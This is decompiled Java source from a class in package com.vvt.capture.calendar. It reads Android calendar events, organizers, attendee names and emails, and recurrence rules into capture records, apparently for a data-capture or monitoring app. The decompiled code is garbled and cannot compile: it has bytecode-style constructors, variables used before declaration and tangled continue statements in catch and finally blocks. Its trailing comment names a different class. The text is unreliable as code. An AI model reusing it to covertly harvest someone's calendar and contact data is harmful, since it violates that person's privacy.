package com.vvt.capture.calendar;

import android.database.Cursor;
import android.text.format.DateFormat;
import com.vvt.capture.calendar.ical.BogusDataException;
import com.vvt.capture.calendar.ical.ParseException;
import com.vvt.capture.calendar.ical.e;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class c
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  private int a(com.vvt.capture.calendar.e.b paramb, String paramString)
  {
    Cursor localCursor = paramb.a(paramString);
    int i = -1;
    if (localCursor != null)
    {
      boolean bool = localCursor.moveToNext();
      if (bool)
      {
        String str = "_id";
        i = localCursor.getColumnIndex(str);
        i = localCursor.getInt(i);
      }
      localCursor.close();
    }
    return i;
  }
  
  private com.vvt.capture.calendar.b.d a(String paramString)
  {
    i = 1;
    j = 0;
    int k = a;
    if (k != 0) {}
    k = a;
    if (k != 0) {}
    locald = new com/vvt/capture/calendar/b/d;
    locald.<init>();
    Object localObject1 = "RRULE:";
    for (;;)
    {
      try
      {
        k = paramString.startsWith((String)localObject1);
        if (k == 0)
        {
          localObject1 = new java/lang/StringBuilder;
          ((StringBuilder)localObject1).<init>();
          localObject4 = "RRULE:";
          localObject1 = ((StringBuilder)localObject1).append((String)localObject4);
          localObject1 = ((StringBuilder)localObject1).append(paramString);
          paramString = ((StringBuilder)localObject1).toString();
        }
        locald1 = new com/vvt/capture/calendar/ical/d;
        k = 1;
        locald1.<init>(paramString, k);
        int m = locald1.a;
        locald.a(m);
        m = locald1.b;
        locald.b(m);
        m = locald1.o;
        locald.c(m);
        localObject1 = locald1.c;
        if (localObject1 != null)
        {
          boolean bool1 = a;
          if (bool1) {}
          localObject1 = Calendar.getInstance();
          localObject4 = locald1.c;
          boolean bool8 = ((com.vvt.capture.calendar.ical.b)localObject4).a();
          if (!bool8) {
            continue;
          }
          localObject4 = locald1.c;
          i8 = ((com.vvt.capture.calendar.ical.b)localObject4).a;
          localb1 = locald1.c;
          i11 = localb1.b + -1;
          localb2 = locald1.c;
          i12 = localb2.c;
          com.vvt.capture.calendar.ical.b localb3 = locald1.c;
          int i13 = localb3.d;
          com.vvt.capture.calendar.ical.b localb4 = locald1.c;
          int i14 = localb4.e;
          com.vvt.capture.calendar.ical.b localb5 = locald1.c;
          int i15 = localb5.f;
          ((Calendar)localObject1).set(i8, i11, i12, i13, i14, i15);
          localObject1 = ((Calendar)localObject1).getTime();
          localObject1 = a((Date)localObject1);
          locald.b((String)localObject1);
        }
        int n = locald1.a;
        if (n != 0) {
          continue;
        }
        bool2 = a;
        if (!bool2) {}
      }
      catch (ParseException localParseException)
      {
        boolean bool2 = b;
        if (!bool2) {
          continue;
        }
        continue;
        int i1 = locald1.a;
        if (i1 != i) {
          continue;
        }
        boolean bool3 = a;
        if (!bool3) {
          continue;
        }
        continue;
        int i2 = locald1.a;
        int i8 = 2;
        if (i2 != i8) {
          continue;
        }
        int i3 = a;
        if (i3 == 0) {
          continue;
        }
        e[] arrayOfe = locald1.h;
        if (arrayOfe == null) {
          continue;
        }
        localObject4 = locald1.h;
        i11 = localObject4.length;
        i3 = 0;
        arrayOfe = null;
        if (j >= i11) {
          continue;
        }
        com.vvt.capture.calendar.ical.b localb2 = localObject4[j];
        int i12 = localb2.b;
        i3 |= i12;
        j += 1;
        continue;
        boolean bool9 = a;
        if (!bool9) {
          continue;
        }
        locald.d(i3);
        continue;
      }
      catch (BogusDataException localBogusDataException)
      {
        boolean bool4 = b;
        if (!bool4) {
          continue;
        }
        continue;
        int i4 = locald1.a;
        int i9 = 3;
        if (i4 != i9) {
          continue;
        }
        boolean bool5 = a;
        if (!bool5) {
          continue;
        }
        Object localObject2 = locald1.h;
        if (localObject2 == null) {
          continue;
        }
        localObject2 = locald1.h;
        i9 = 0;
        localObject4 = null;
        localObject2 = localObject2[0];
        int i5 = ((e)localObject2).b;
        localObject4 = locald1.h;
        i11 = 0;
        localb1 = null;
        localObject4 = localObject4[0];
        j = ((e)localObject4).c;
        localObject4 = locald1.l;
        if (localObject4 == null) {
          continue;
        }
        localObject2 = locald1.l;
        i9 = 0;
        localObject4 = null;
        i5 = localObject2[0];
        boolean bool10 = a;
        if (!bool10) {
          continue;
        }
        bool10 = a;
        if (!bool10) {
          continue;
        }
        locald.e(i5);
        locald.f(j);
        continue;
      }
      finally
      {
        com.vvt.capture.calendar.ical.d locald1;
        boolean bool6 = b;
        if (!bool6) {
          continue;
        }
        continue;
        int i6 = locald1.a;
        int i10 = 4;
        if (i6 != i10) {
          continue;
        }
        boolean bool7 = a;
        if (!bool7) {
          continue;
        }
        int[] arrayOfInt = locald1.n;
        if (arrayOfInt == null) {
          continue;
        }
        arrayOfInt = locald1.n;
        i10 = 0;
        Object localObject4 = null;
        int i7 = arrayOfInt[0];
        i10 = i7;
        arrayOfInt = locald1.l;
        if (arrayOfInt == null) {
          continue;
        }
        arrayOfInt = locald1.l;
        int i11 = 0;
        com.vvt.capture.calendar.ical.b localb1 = null;
        i7 = arrayOfInt[0];
        boolean bool11 = a;
        if (!bool11) {
          continue;
        }
        bool11 = a;
        if (!bool11) {
          continue;
        }
        locald.e(i7);
        locald.g(i10);
        continue;
        i7 = 0;
        arrayOfInt = null;
        continue;
        i10 = 0;
        localObject4 = null;
        continue;
        i7 = 0;
        arrayOfInt = null;
        continue;
      }
      bool2 = a;
      if (bool2) {}
      return locald;
      localObject4 = locald1.c;
      i8 = ((com.vvt.capture.calendar.ical.b)localObject4).a;
      localb1 = locald1.c;
      i11 = localb1.b + -1;
      localb2 = locald1.c;
      i12 = localb2.c;
      ((Calendar)localObject1).set(i8, i11, i12);
    }
  }
  
  private String a(Date paramDate)
  {
    return DateFormat.format("yyyy-MM-dd hh:mm:ss", paramDate).toString();
  }
  
  private List a(com.vvt.capture.calendar.e.b paramb, int paramInt, String paramString1, String paramString2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = "calendar_id = ? AND " + paramString2 + " = ? AND " + "eventStatus" + " = 2 ";
    int i = 2;
    Object localObject2 = new String[i];
    String str1 = null;
    String str2 = Integer.toString(paramInt);
    localObject2[0] = str2;
    int j = 1;
    localObject2[j] = paramString1;
    localObject1 = paramb.a((String)localObject1, (String[])localObject2);
    if (localObject1 != null)
    {
      for (;;)
      {
        boolean bool = ((Cursor)localObject1).moveToNext();
        if (!bool) {
          break;
        }
        localObject2 = new java/util/Date;
        str1 = "dtstart";
        j = ((Cursor)localObject1).getColumnIndex(str1);
        long l = ((Cursor)localObject1).getLong(j);
        ((Date)localObject2).<init>(l);
        localObject2 = a((Date)localObject2);
        localArrayList.add(localObject2);
      }
      ((Cursor)localObject1).close();
    }
    return localArrayList;
  }
  
  public List a(com.vvt.capture.calendar.b.c paramc, com.vvt.capture.calendar.e.b paramb)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int i = paramc.b();
    Cursor localCursor = paramb.a(i);
    for (;;)
    {
      int i1;
      Object localObject4;
      Object localObject5;
      String str4;
      Object localObject6;
      Object localObject8;
      Object localObject9;
      int i6;
      String str5;
      Object localObject10;
      boolean bool3;
      try
      {
        boolean bool2 = localCursor.moveToNext();
        if (!bool2) {
          break label1323;
        }
        Object localObject1 = "eventStatus";
        int j = localCursor.getColumnIndex((String)localObject1);
        j = localCursor.getInt(j);
        int m = 2;
        if (j == m) {
          continue;
        }
        localObject1 = "_id";
        j = localCursor.getColumnIndex((String)localObject1);
        i1 = localCursor.getInt(j);
        localObject1 = "title";
        j = localCursor.getColumnIndex((String)localObject1);
        String str1 = localCursor.getString(j);
        localObject1 = "description";
        j = localCursor.getColumnIndex((String)localObject1);
        String str2 = localCursor.getString(j);
        localObject4 = new java/util/Date;
        localObject1 = "dtstart";
        j = localCursor.getColumnIndex((String)localObject1);
        long l1 = localCursor.getLong(j);
        ((Date)localObject4).<init>(l1);
        localObject1 = "0000-00-00 00:00:00";
        localObject5 = "eventLocation";
        m = localCursor.getColumnIndex((String)localObject5);
        localObject5 = localCursor.getString(m);
        String str3 = com.vvt.ag.b.b((String)localObject5);
        localObject5 = "organizer";
        m = localCursor.getColumnIndex((String)localObject5);
        localObject5 = localCursor.getString(m);
        str4 = com.vvt.ag.b.b((String)localObject5);
        localObject6 = "0000-00-00 00:00:00";
        localObject5 = "0000-00-00 00:00:00";
        localObject7 = "_sync_id";
        int i2 = localCursor.getColumnIndex((String)localObject7);
        if (i2 >= 0)
        {
          i2 = 1;
          i3 = i2;
          localObject7 = "originalEvent";
          i2 = localCursor.getColumnIndex((String)localObject7);
          if (i2 < 0) {
            break label1111;
          }
          i2 = 1;
          i4 = i2;
          localObject7 = "original_sync_id";
          i2 = localCursor.getColumnIndex((String)localObject7);
          if (i2 < 0) {
            break label1123;
          }
          i2 = 1;
          i5 = i2;
          i2 = 0;
          localObject7 = null;
          if (i4 == 0) {
            break label1135;
          }
          localObject7 = "originalEvent";
          localObject8 = localObject7;
          localObject7 = "originalInstanceTime";
          i2 = localCursor.getColumnIndex((String)localObject7);
          bool6 = localCursor.isNull(i2);
          if ((bool6) || ((i4 == 0) && (i5 == 0))) {
            break label1367;
          }
          localObject6 = new java/util/Date;
          localObject9 = "originalInstanceTime";
          i1 = localCursor.getColumnIndex((String)localObject9);
          long l2 = localCursor.getLong(i1);
          ((Date)localObject6).<init>(l2);
          localObject6 = a((Date)localObject6);
          i1 = localCursor.getColumnIndex((String)localObject8);
          localObject9 = localCursor.getString(i1);
          i1 = a(paramb, (String)localObject9);
          localObject7 = localObject6;
          i6 = i1;
          localObject6 = "lastDate";
          int i7 = localCursor.getColumnIndex((String)localObject6);
          boolean bool7 = localCursor.isNull(i7);
          if (bool7) {
            break label1360;
          }
          localObject5 = new java/util/Date;
          localObject6 = "lastDate";
          int i8 = localCursor.getColumnIndex((String)localObject6);
          long l3 = localCursor.getLong(i8);
          ((Date)localObject5).<init>(l3);
          localObject5 = a((Date)localObject5);
          localObject9 = localObject5;
          localObject5 = "rrule";
          m = localCursor.getColumnIndex((String)localObject5);
          str5 = localCursor.getString(m);
          String str6 = "0000-00-00 00:00:00";
          String str7 = "0000-00-00 00:00:00";
          localObject4 = a((Date)localObject4);
          str2 = com.vvt.ag.b.b(str2);
          m = 0;
          localObject5 = null;
          localObject6 = "dtend";
          i8 = localCursor.getColumnIndex((String)localObject6);
          boolean bool8 = localCursor.isNull(i8);
          if (bool8) {
            break label1353;
          }
          localObject1 = new java/util/Date;
          localObject6 = "dtend";
          int i9 = localCursor.getColumnIndex((String)localObject6);
          long l4 = localCursor.getLong(i9);
          long l5 = l4;
          ((Date)localObject1).<init>(l4);
          localObject1 = a((Date)localObject1);
          localObject6 = localObject1;
          localObject10 = paramb.a(i6, str4);
          if (localObject10 == null) {
            break label1346;
          }
          j = ((Cursor)localObject10).getCount();
          if (j <= 0) {
            break label1346;
          }
          ((Cursor)localObject10).moveToFirst();
          localObject1 = "attendeeName";
          j = ((Cursor)localObject10).getColumnIndex((String)localObject1);
          localObject1 = ((Cursor)localObject10).getString(j);
          localObject1 = com.vvt.ag.b.b((String)localObject1);
          if (localObject10 != null) {
            ((Cursor)localObject10).close();
          }
          localObject10 = new com/vvt/capture/calendar/b/b;
          ((com.vvt.capture.calendar.b.b)localObject10).<init>();
          l5 = i6;
          ((com.vvt.capture.calendar.b.b)localObject10).a(l5);
          ((com.vvt.capture.calendar.b.b)localObject10).b(str7);
          ((com.vvt.capture.calendar.b.b)localObject10).h(str2);
          ((com.vvt.capture.calendar.b.b)localObject10).d((String)localObject4);
          ((com.vvt.capture.calendar.b.b)localObject10).e((String)localObject6);
          i9 = 0;
          localObject6 = null;
          ((com.vvt.capture.calendar.b.b)localObject10).a(0);
          ((com.vvt.capture.calendar.b.b)localObject10).c(str6);
          ((com.vvt.capture.calendar.b.b)localObject10).g(str3);
          ((com.vvt.capture.calendar.b.b)localObject10).j((String)localObject1);
          ((com.vvt.capture.calendar.b.b)localObject10).i(str4);
          ((com.vvt.capture.calendar.b.b)localObject10).f((String)localObject7);
          j = 0;
          localObject1 = null;
          ((com.vvt.capture.calendar.b.b)localObject10).b(0);
          bool3 = com.vvt.ag.b.a(str5);
          if (!bool3) {
            break label1151;
          }
          bool3 = false;
          localObject1 = null;
          ((com.vvt.capture.calendar.b.b)localObject10).a((com.vvt.capture.calendar.b.d)localObject5);
          ((com.vvt.capture.calendar.b.b)localObject10).a(str1);
          ((com.vvt.capture.calendar.b.b)localObject10).a(bool3);
          localObject1 = paramb.b(i6);
          if (localObject1 == null) {
            break label1197;
          }
          boolean bool5 = a;
          if (bool5) {}
          bool5 = ((Cursor)localObject1).moveToNext();
          if (!bool5) {
            break label1197;
          }
          localObject5 = "attendeeName";
          int n = ((Cursor)localObject1).getColumnIndex((String)localObject5);
          localObject5 = ((Cursor)localObject1).getString(n);
          str4 = "attendeeEmail";
          int i10 = ((Cursor)localObject1).getColumnIndex(str4);
          str4 = ((Cursor)localObject1).getString(i10);
          boolean bool9 = a;
          if (bool9) {}
          bool9 = a;
          if (bool9) {}
          localObject6 = new com/vvt/capture/calendar/b/a;
          ((com.vvt.capture.calendar.b.a)localObject6).<init>();
          ((com.vvt.capture.calendar.b.a)localObject6).a((String)localObject5);
          ((com.vvt.capture.calendar.b.a)localObject6).b(str4);
          ((com.vvt.capture.calendar.b.b)localObject10).a((com.vvt.capture.calendar.b.a)localObject6);
          continue;
        }
        bool6 = false;
      }
      finally
      {
        if (localCursor != null) {
          localCursor.close();
        }
      }
      Object localObject7 = null;
      int i3 = 0;
      continue;
      label1111:
      boolean bool6 = false;
      localObject7 = null;
      int i4 = 0;
      continue;
      label1123:
      bool6 = false;
      localObject7 = null;
      int i5 = 0;
      continue;
      label1135:
      if (i5 != 0)
      {
        localObject7 = "original_sync_id";
        localObject8 = localObject7;
        continue;
        label1151:
        bool3 = true;
        localObject5 = a(str5);
        ((com.vvt.capture.calendar.b.d)localObject5).a((String)localObject4);
        str4 = ((com.vvt.capture.calendar.b.d)localObject5).b();
        boolean bool10 = com.vvt.ag.b.a(str4);
        if (bool10)
        {
          ((com.vvt.capture.calendar.b.d)localObject5).b((String)localObject9);
          continue;
          label1197:
          if (localObject2 != null) {
            ((Cursor)localObject2).close();
          }
          if ((i3 != 0) && ((i4 != 0) || (i5 != 0)))
          {
            localObject3 = "_sync_id";
            int k = localCursor.getColumnIndex((String)localObject3);
            localObject5 = localCursor.getString(k);
            localObject3 = new java/util/ArrayList;
            ((ArrayList)localObject3).<init>();
            bool10 = com.vvt.ag.b.a((String)localObject5);
            if (!bool10)
            {
              k = paramc.b();
              localObject3 = a(paramb, k, (String)localObject5, (String)localObject8);
            }
            ((com.vvt.capture.calendar.b.b)localObject10).a((List)localObject3);
            bool4 = a;
            if (!bool4) {}
          }
          boolean bool4 = a;
          if (bool4) {}
          localArrayList.add(localObject10);
          continue;
          label1323:
          if (localCursor != null) {
            localCursor.close();
          }
          bool4 = a;
          if (bool4) {}
          return localArrayList;
          label1346:
          Object localObject3 = str4;
          continue;
          label1353:
          localObject6 = localObject3;
          continue;
          label1360:
          localObject9 = localObject5;
          continue;
          label1367:
          localObject7 = localObject6;
          i6 = i1;
        }
      }
      else
      {
        localObject8 = null;
      }
    }
  }
  
  public List a(com.vvt.capture.calendar.e.b paramb)
  {
    boolean bool1 = a;
    if (bool1) {}
    Cursor localCursor1 = paramb.a();
    ArrayList localArrayList = new java/util/ArrayList;
    int i = localCursor1.getCount();
    localArrayList.<init>(i);
    for (;;)
    {
      boolean bool2 = localCursor1.moveToNext();
      if (!bool2) {
        break;
      }
      com.vvt.capture.calendar.b.c localc = com.vvt.capture.calendar.b.c.a(localCursor1);
      int j = localc.b();
      Cursor localCursor2 = paramb.a(j);
      int k = localCursor2.getCount();
      localc.a(k);
      localCursor2.close();
      localArrayList.add(localc);
    }
    localCursor1.close();
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calendar/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */